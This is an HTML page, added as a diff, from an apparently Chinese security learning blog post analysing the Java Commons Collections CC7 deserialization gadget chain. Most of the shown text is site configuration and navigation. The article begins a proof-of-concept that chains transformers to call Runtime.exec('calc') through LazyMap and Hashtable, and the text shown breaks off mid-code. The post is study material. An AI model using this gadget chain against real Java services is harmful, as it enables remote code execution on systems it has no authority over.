@@ -1,0 +1,556 @@
+<!DOCTYPE html><html lang="zh-CNs" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>java反序列化--CC7 | VV</title><meta name="keywords" content="java安全,java,学习,CC链"><meta name="author" content="VVkladg0r"><meta name="copyright" content="VVkladg0r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="java反序列化--CC7"><meta name="application-name" content="java反序列化--CC7"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="java反序列化--CC7"><meta property="og:url" content="http://cszvvds.cc/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7/index.html"><meta property="og:site_name" content="VV"><meta property="og:description" content="java反序列化–CC7利用条件 和CC5一样 只有：3.1&amp;gt;Common-Collection&amp;lt;&amp;#x3D;3.2.1&amp;amp;&amp;amp;Commons-Collections&amp;#x3D;4.0 POCpackage example;import org.apache.commons."><meta property="og:locale" content="zh-CNs"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="VVkladg0r"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="java反序列化–CC7利用条件 和CC5一样 只有：3.1&amp;gt;Common-Collection&amp;lt;&amp;#x3D;3.2.1&amp;amp;&amp;amp;Commons-Collections&amp;#x3D;4.0 POCpackage example;import org.apache.commons."><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://cszvvds.cc/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2023/09/03/125766904/ee23df8517f3c3e3efc4145658269c06_5714860933110284659.png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"VV:QAQ","backTitle":"VV!"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: false,
+  mainTone: undefined,
+  authorStatus: {"skills":null},
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: VVkladg0r","link":"链接: ","source":"来源: VV","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'VV',
+  title: 'java反序列化--CC7',
+  postAI: '',
+  pageFillDescription: 'java反序列化–CC7, POC, 链子分析, 细节处理, 为什么要hash值相同, 第二个元素（yyx3Dyy）从何而来反序列化利用条件和一样只有基于的利用链构造核心利用代码使用来构造利用链调用输出两个元素的值这里可以不要反射序列化反序列化嗯注意这里的是不能更改的是计算出的结果我最开始以为是随便加的更改了导致不能调出计算器这个我们后面会说链子分析从思路上来说我个人觉得利用链更像是从利用链改造而来只不过是链没有使用而是使用了来构造新的利用链使用数组来构造利用代码然后通过反射将数组设置给类的属性这一步和利用链的构造思路上基本一致没什么好说的在构造利用链时仍然使用了来构造利用链不同的是使用了新的链来触发利用链最终执行核心利用代码我们重点来看是如何构造利用链的先来看序列化过程有一个类型的属性并且还是一个数组用于存放元素键值对在序列化时会先把数组的容量写入到序列化流中再写入数组中的元素个数然后将数组中的元素取出写入到序列化流中我们再回头看的反序列化流程截不完我们可以看到会先从反序列化流中读取数组的容量和元素个数并根据和计算出数组的再根据计算得到的来创建数组和可以决定数组的大小然后从反序列化流中依次读取每个元素然后调用方法将元素重新放入数组的属性最终完成反序列化这里唯一不知道的就是方法我们点进去看下它首先对进行不为的校验否则抛出反序列化异常然后根据计算出元素在数组中的存储索引判断元素在数组中是否重复如果重复则抛出异常如果不重复则将元素转换成并添加到数组中而利用链的漏洞触发的关键就在方法中该方法在判断重复元素的时候校验了两个元素的值是否一样然后接着会调用方法判断是否重复时就会触发漏洞调用了的方法但是中并没有方法实际上是调用了的父类的方法虽然是一个抽象类但它实现了方法注在添加第一个元素时并不会进入语句调用方法进行判断因此中的元素至少为个并且元素的值也必须相同的情况下才会调用方法否则不会触发漏洞因为其中存在着一个短路就是如果的话会直接返回就不会执行到我们想要的好我们再来看是哪里来的我们一路追踪发现是从跟进来的一个新但是它并没有设置这种东西所以我们只能从这里下手这里有可以来创建它会根据我们传入的的来创建一个和当前存在相同的一个好我们继续分析链子回到的方法类的方法只比较了这两个的引用如果不是同一对象会再次调用方法属性是通过传递的我们在构造利用链的时候通过的静态方法将传给了属性因此这里会调用的方法但是中并没有找到一个名字为的成员方法但是通过分析发现继承了抽象类该类中有一个方法抽象类的方法进行了更为复杂的判断判断是否为同一对象判断对象的运行类型判断中元素的个数当以上三个判断都不满足的情况下则进一步判断中的元素也就是判断元素的和的内容是否相同在不为的情况下会调用方法获取的内容虽然对象向上转型成类型但是对象本质上是一个因此对象调用方法时实际上是调用了的方法调到了的话链子其实就通了调用流程后续其实就一样了沿着方法继续往下写的细节处理为什么要值相同其实几乎就是我们上面注里写的一模一样我这里复制下来继续分析其中存在着一个短路就是如果的话会直接返回就不会执行到我们想要的好我们再来看是哪里来的我们一路追踪发现是从跟进来的一个新但是它并没有设置这种东西所以我们只能从这里下手这里有可以来创建它会根据我们传入的的来创建一个和当前存在相同的一个我们在回头来看重点看下这个循环他将中的所有都甩进了方法一次我们需要甩两个进中这样才能正常的进入我们想要的方法这样就有了这里两个的值和值不能同时相同同时相同则无法进入判断因为在中计算会把两个计算为只有一个从而只进行一次循环在中和的值相同所以就拿这两个来进行比较为什么这两个的值是一样的继续跟踪方法发现当调用方法实际上会调用抽象类的方法抽象类的方法实际调用了中的元素的方法准确来说是节点的方法类调用了类的静态方法计算和的值然后再进行异或运算得到一个新的值继续跟进类的静态方法到这我们基本可以知道实际上底层调用了字符串的包装类的方法方法通过字符的码值计算得到一个的值计算过程第一次计算的时候的值是小写字母的码值就是值为第二次计算的时候的值是还是小写的字母的值为最终得到值为然后返回到类中的方法进行亦或运算得到一个新的值并返回到类的方法中最终的值就是其他的同理所以中元素的值是经过精心构造的其目的就是为了构造两个值相同的从而触发漏洞其实的字符串是可以替换的但中的字符串的值必须相同例如把的字符串改成以下值同样也可以触发漏洞第二个元素从何而来我们可以看到在添加第二个元素时集合会莫名其妙添加一个元素这其实是在调用方法添加元素的时候会调用方法判断是否为同一对象而在中会调用的方法添加一个元素例如调用方法添加第二个元素的时候该方法内部会调用方法根据元素的判断是否为同一元素此时的是对象而实际上调用了抽象类的方法方法内部会调用的方法判断数组中元素的在是否已存在如果不存在会把当前传入的返回作为然后会调用方法把和添加到当在反序列化时方法在还原数组时会调用方法判断重复元素由于抽象类的方法校验的时候更为严格会判断中元素的个数由于和中的元素个数不一样则直接返回那么也就不会触发漏洞回到因此在构造利用链的代码时在添加第二个元素后需要调用方法删除元素才能触发漏洞好差不多就这样吧其实整个链还是有点不熟应该还要再花点时间来总结沉淀一下会写一个总结的',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-06-07 21:31:41',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 5 || hour >= 5
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.2.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">VV</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://bu.dusays.com/2024/05/13/6640eacb0aad7.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://bu.dusays.com/2024/05/13/6640eacae5439.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://bu.dusays.com/2024/05/13/6640eacae5439.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CC%E9%93%BE/" style="font-size: 1.05rem;">CC链<sup>7</sup></a><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>12</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">java安全<sup>12</sup></a><a href="/tags/misc/" style="font-size: 1.05rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>7</sup></a><a href="/tags/wp/" style="font-size: 1.05rem;">wp<sup>7</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 1.05rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 1.05rem;">内网<sup>1</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 1.05rem;">学习<sup>12</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">工具<sup>2</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 1.05rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">June 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">8</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">May 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">25</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url">学习</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/java%E5%AE%89%E5%85%A8/" itemprop="url">java安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/java%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>java安全</span></a><a class="article-meta__tags" href="/tags/java/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>java</span></a><a class="article-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>学习</span></a><a class="article-meta__tags" href="/tags/CC%E9%93%BE/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>CC链</span></a></span></div></div><h1 class="post-title" itemprop="name headline">java反序列化--CC7</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-06-07T13:21:19.000Z" title="发表于 2024-06-07 21:21:19">2024-06-07</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-06-07T13:31:41.990Z" title="更新于 2024-06-07 21:31:41">2024-06-07</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">2.9k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="java反序列化--CC7"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://cszvvds.cc/2024/06/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7/"><header><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url">学习</a><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0/java%E5%AE%89%E5%85%A8/" itemprop="url">java安全</a><a href="/tags/java%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">java安全</a><a href="/tags/java/" tabindex="-1" itemprop="url">java</a><a href="/tags/%E5%AD%A6%E4%B9%A0/" tabindex="-1" itemprop="url">学习</a><a href="/tags/CC%E9%93%BE/" tabindex="-1" itemprop="url">CC链</a><h1 id="CrawlerTitle" itemprop="name headline">java反序列化--CC7</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">VVkladg0r</span><time itemprop="dateCreated datePublished" datetime="2024-06-07T13:21:19.000Z" title="发表于 2024-06-07 21:21:19">2024-06-07</time><time itemprop="dateCreated datePublished" datetime="2024-06-07T13:31:41.990Z" title="更新于 2024-06-07 21:31:41">2024-06-07</time></header><h1 id="java反序列化–CC7"><a href="#java反序列化–CC7" class="headerlink" title="java反序列化–CC7"></a>java反序列化–CC7</h1><p>利用条件 和CC5一样</p>
+<p><strong>只有：3.1&gt;Common-Collection&lt;&#x3D;3.2.1&amp;&amp;Commons-Collections&#x3D;4.0</strong></p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//     基于Hashtable的利用链</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//构造核心利用代码</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//使用Hashtable来构造利用链调用LazyMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.lazyMap(hashMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.lazyMap(hashMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">1</span>);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="comment">//输出两个元素的hash值 这里可以不要</span></span><br><span class="line">        System.out.println(<span class="string">&quot;lazyMap1 hashcode:&quot;</span> + lazyMap1.hashCode());</span><br><span class="line">        System.out.println(<span class="string">&quot;lazyMap2 hashcode:&quot;</span> + lazyMap2.hashCode());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//iTransformers = transformers（反射）</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        